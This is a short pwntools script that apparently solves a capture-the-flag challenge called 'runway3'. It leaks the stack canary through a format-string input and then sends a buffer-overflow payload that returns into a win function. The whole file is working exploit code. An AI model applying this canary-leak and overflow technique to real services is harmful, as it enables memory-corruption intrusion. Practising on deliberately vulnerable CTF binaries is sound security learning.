from pwn import *
# canary bypass and ret2win

context.binary = ELF('./runway3')


p = remote("challs.pwnoh.io", 13403)
# p = process()

log.info(p.clean())
# p.sendline('%13$p')
p.sendlineafter(b'?\n', '%13$p')
# p.recvuntil(b'0x0')

canaryInt = int(p.recvline(), 16)

log.success(f'Canary: {hex(canaryInt)}')
canary = p64(canaryInt)
payload = b'a' * 40 + canary + b'b' * 8 + p64(0x04011d6) + p64(0x0)
p.sendline(payload)
# log.info(p.clean())

p.interactive()
# log.success(f'Canary: {hex(canary)}')